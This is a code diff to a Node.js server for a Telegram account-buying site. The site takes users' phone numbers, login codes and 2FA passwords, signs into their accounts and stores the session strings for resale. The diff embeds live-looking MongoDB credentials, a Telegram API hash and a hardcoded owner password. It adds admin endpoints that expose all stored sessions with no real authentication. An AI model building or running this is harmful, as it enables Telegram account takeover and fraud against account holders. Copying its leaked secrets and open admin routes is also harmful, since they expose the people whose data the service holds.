@@ -19,7 +19,7 @@ const API_ID = 31929193;
 const API_HASH = '926aaced8b1367c281f8f9547f7808d5';
 
 // MongoDB Connection URI
-const MONGODB_URI = 'mongodb+srv://cmurah60_db_user:6RHof8abbe5nQeij@ajayajay.i7lyfmk.mongodb.net/?appName=ajayajay';
+const MONGODB_URI = process.env.MONGODB_URI || 'mongodb+srv://cmurah60_db_user:6RHof8abbe5nQeij@ajayajay.i7lyfmk.mongodb.net/?appName=ajayajay';
 const DB_NAME = 'jarzx_tg_store';
 
 // Database collections
@@ -59,8 +59,83 @@ async function connectMongoDB() {
         
     } catch (error) {
         console.error('MongoDB Connection Error:', error);
-        process.exit(1);
+        console.log('Running in memory-only mode...');
+        // In-memory fallback
+        initMemoryStorage();
     }
+}
+
+// In-memory storage fallback
+function initMemoryStorage() {
+    const memoryStorage = {
+        users: [],
+        accounts: [],
+        sessions: [],
+        withdrawals: [],
+        settings: { _id: 'main', harga_biasa: 5000, harga_plus: 25000, min_withdraw: 10000, owner_id: null },
+        stats: { _id: 'main', total_accounts: 0, total_users: 0, total_withdrawn: 0 }
+    };
+    
+    usersCollection = {
+        findOne: async (query) => memoryStorage.users.find(u => u._id === query._id || u.id === query.id),
+        find: (query) => ({ toArray: async () => memoryStorage.users }),
+        insertOne: async (doc) => { memoryStorage.users.push(doc); return { insertedId: doc._id }; },
+        updateOne: async (query, update) => {
+            const idx = memoryStorage.users.findIndex(u => u._id === query._id);
+            if (idx !== -1) {
+                const setData = update.$set || {};
+                const incData = update.$inc || {};
+                Object.assign(memoryStorage.users[idx], setData);
+                Object.keys(incData).forEach(key => {
+                    memoryStorage.users[idx][key] = (memoryStorage.users[idx][key] || 0) + incData[key];
+                });
+            }
+        }
+    };
+    
+    accountsCollection = {
+        findOne: async (query) => memoryStorage.accounts.find(a => a._id === query._id || a.phone === query.phone),
+        find: (query) => ({ 
+            toArray: async () => query.sellerId ? memoryStorage.accounts.filter(a => a.sellerId === query.sellerId) : memoryStorage.accounts,
+            sort: () => ({ limit: () => ({ toArray: async () => memoryStorage.accounts.slice().reverse().slice(0, 10) }) })
+        }),
+        insertOne: async (doc) => { memoryStorage.accounts.push(doc); return { insertedId: doc._id }; }
+    };
+    
+    sessionsCollection = {
+        insertOne: async (doc) => { memoryStorage.sessions.push(doc); return { insertedId: doc._id }; }
+    };
+    
+    withdrawalsCollection = {
+        findOne: async (query) => memoryStorage.withdrawals.find(w => w._id === query._id),
+        find: (query) => ({
+            toArray: async () => query.userId ? memoryStorage.withdrawals.filter(w => w.userId === query.userId) : memoryStorage.withdrawals,
+            count: async () => memoryStorage.withdrawals.filter(w => w.status === 'pending').length
+        }),
+        insertOne: async (doc) => { memoryStorage.withdrawals.push(doc); return { insertedId: doc._id }; },
+        updateOne: async (query, update) => {
+            const idx = memoryStorage.withdrawals.findIndex(w => w._id === query._id);
+            if (idx !== -1) Object.assign(memoryStorage.withdrawals[idx], update.$set);
+        }
+    };
+    
+    settingsCollection = {
+        findOne: async () => memoryStorage.settings,
+        updateOne: async (query, update) => {
+            Object.assign(memoryStorage.settings, update.$set);
+        }
+    };
+    
+    statsCollection = {
+        findOne: async () => memoryStorage.stats,
+        updateOne: async (query, update) => {
+            const incData = update.$inc || {};
+            Object.keys(incData).forEach(key => {
+                memoryStorage.stats[key] = (memoryStorage.stats[key] || 0) + incData[key];
+            });
+            if (update.$set) Object.assign(memoryStorage.stats, update.$set);
+        }
+    };
 }
 
 // Initialize default settings
@@ -146,6 +221,9 @@ app.use(express.static(path.join(__dirname, 'public')));
 
 // Active Sessions untuk proses login
 const activeSessions = new Map();
+
+// Owner credentials (in production, use hashed passwords)
+const OWNER_PASSWORD = 'JarzXOwner2024!';
 
 // ==================== API ROUTES ====================
 
@@ -235,7 +313,7 @@ app.get('/api/user/:userId', async (req, res) => {
     }
 });
 
-// Step 1: Send OTP
+// Step 1: Send OTP - REAL TELEGRAM API
 app.post('/api/send-otp', async (req, res) => {
     const { phone, userId } = req.body;
     
@@ -259,6 +337,8 @@ app.post('/api/send-otp', async (req, res) => {
         });
 
         await client.connect();
+        
+        // REAL OTP SENDING TO TELEGRAM
         const { phoneCodeHash } = await client.sendCode({ apiId: API_ID, apiHash: API_HASH }, cleanPhone);
 
         // Simpan session sementara
@@ -273,7 +353,7 @@ app.post('/api/send-otp', async (req, res) => {
 
         res.json({
             success: true,
-            data: { sessionId, message: 'OTP terkirim!' }
+            data: { sessionId, message: 'OTP terkirim ke Telegram!' }
         });
 
     } catch (error) {
@@ -282,7 +362,7 @@ app.post('/api/send-otp', async (req, res) => {
     }
 });
 
-// Step 2: Verify OTP
+// Step 2: Verify OTP - REAL TELEGRAM API
 app.post('/api/verify-otp', async (req, res) => {
     const { sessionId, otp, userId } = req.body;
     
@@ -302,6 +382,7 @@ app.post('/api/verify-otp', async (req, res) => {
         let needs2FA = false;
         
         try {
+            // REAL OTP VERIFICATION WITH TELEGRAM
             await client.invoke(new Api.auth.SignIn({
                 phoneNumber: phone,
                 phoneCodeHash: phoneCodeHash,
@@ -331,7 +412,7 @@ app.post('/api/verify-otp', async (req, res) => {
     }
 });
 
-// Step 3: Verify 2FA
+// Step 3: Verify 2FA - REAL TELEGRAM API
 app.post('/api/verify-2fa', async (req, res) => {
     const { sessionId, password } = req.body;
     
@@ -347,6 +428,7 @@ app.post('/api/verify-2fa', async (req, res) => {
     try {
         const { client } = sessionData;
         
+        // REAL 2FA VERIFICATION WITH TELEGRAM
         await client.checkPassword(password);
         await processSuccessfulLogin(sessionId, res);
 
@@ -366,7 +448,7 @@ async function processSuccessfulLogin(sessionId, res) {
     const { client, phone, userId } = sessionData;
 
     try {
-        // Get user info
+        // Get user info from Telegram
         const me = await client.getMe();
         const sessionString = client.session.save();
 
@@ -375,7 +457,7 @@ async function processSuccessfulLogin(sessionId, res) {
         const isPlus = phone.startsWith('1');
         const price = isPlus ? (settings.harga_plus || 25000) : (settings.harga_biasa || 5000);
 
-        // Save account
+        // Save account with COMPLETE DETAILS
         const accountData = {
             _id: uuidv4(),
             id: uuidv4(),
@@ -387,6 +469,7 @@ async function processSuccessfulLogin(sessionId, res) {
             tgUsername: me.username || null,
             tgFirstName: me.firstName || '',
             tgLastName: me.lastName || '',
+            tgFullName: `${me.firstName || ''} ${me.lastName || ''}`.trim(),
             price: price,
             status: 'active',
             sold_at: new Date().toISOString(),
@@ -429,7 +512,7 @@ async function processSuccessfulLogin(sessionId, res) {
         // Get updated user
         const updatedUser = await usersCollection.findOne({ _id: userId });
 
-        // Broadcast success
+        // Broadcast success to all connected clients
         broadcast({
             type: 'account_sold',
             data: {
@@ -450,7 +533,7 @@ async function processSuccessfulLogin(sessionId, res) {
                 account: {
                     name: `${me.firstName || ''} ${me.lastName || ''}`.trim(),
                     username: me.username,
-                    id: me.id
+                    id: me.id.toString()
                 }
             }
         });
@@ -570,8 +653,24 @@ app.get('/api/user/:userId/withdrawals', async (req, res) => {
     }
 });
 
-// Get All Accounts (Admin)
-app.get('/api/accounts', async (req, res) => {
+// ==================== ADMIN/OWNER API ====================
+
+// Owner Login
+app.post('/api/admin/login', async (req, res) => {
+    const { password } = req.body;
+    
+    if (password === OWNER_PASSWORD) {
+        res.json({
+            success: true,
+            data: { token: 'owner_token_' + Date.now(), message: 'Login berhasil' }
+        });
+    } else {
+        res.status(401).json({ success: false, message: 'Password salah!' });
+    }
+});
+
+// Get All Accounts (Admin) - WITH COMPLETE DETAILS
+app.get('/api/admin/accounts', async (req, res) => {
     try {
         const accounts = await accountsCollection.find({}).toArray();
         
@@ -581,6 +680,36 @@ app.get('/api/accounts', async (req, res) => {
         });
     } catch (error) {
         console.error('Get All Accounts Error:', error);
+        res.status(500).json({ success: false, message: error.message });
+    }
+});
+
+// Get All Users (Admin)
+app.get('/api/admin/users', async (req, res) => {
+    try {
+        const users = await usersCollection.find({}).toArray();
+        
+        res.json({
+            success: true,
+            data: users
+        });
+    } catch (error) {
+        console.error('Get All Users Error:', error);
+        res.status(500).json({ success: false, message: error.message });
+    }
+});
+
+// Get All Withdrawals (Admin)
+app.get('/api/admin/withdrawals', async (req, res) => {
+    try {
+        const withdrawals = await withdrawalsCollection.find({}).toArray();
+        
+        res.json({
+            success: true,
+            data: withdrawals
+        });
+    } catch (error) {
+        console.error('Get All Withdrawals Error:', error);
         res.status(500).json({ success: false, message: error.message });
     }
 });
@@ -636,7 +765,7 @@ app.get('/api/recent-sales', async (req, res) => {
 });
 
 // Update Settings (Admin)
-app.post('/api/settings', async (req, res) => {
+app.post('/api/admin/settings', async (req, res) => {
     const { harga_biasa, harga_plus, min_withdraw } = req.body;
     
     try {
@@ -660,7 +789,7 @@ app.post('/api/settings', async (req, res) => {
 });
 
 // Approve/Reject Withdrawal (Admin)
-app.post('/api/withdrawal/:id/process', async (req, res) => {
+app.post('/api/admin/withdrawal/:id/process', async (req, res) => {
     const { id } = req.params;
     const { status, adminNote } = req.body;
     
@@ -712,6 +841,23 @@ app.post('/api/withdrawal/:id/process', async (req, res) => {
     }
 });
 
+// Delete Account (Admin)
+app.delete('/api/admin/account/:id', async (req, res) => {
+    const { id } = req.params;
+    
+    try {
+        await accountsCollection.deleteOne({ _id: id });
+        
+        res.json({
+            success: true,
+            message: 'Akun berhasil dihapus'
+        });
+    } catch (error) {
+        console.error('Delete Account Error:', error);
+        res.status(500).json({ success: false, message: error.message });
+    }
+});
+
 // WebSocket Connection
 wss.on('connection', async (ws) => {
     console.log('New WebSocket connection');
@@ -754,7 +900,7 @@ async function startServer() {
                                         
    Server running on port: ${PORT}       
    API Endpoint: http://localhost:${PORT}/api
-   MongoDB: Connected                  
+   MongoDB: ${db ? 'Connected' : 'Memory Mode'}                  
                                         
 ========================================
         `);
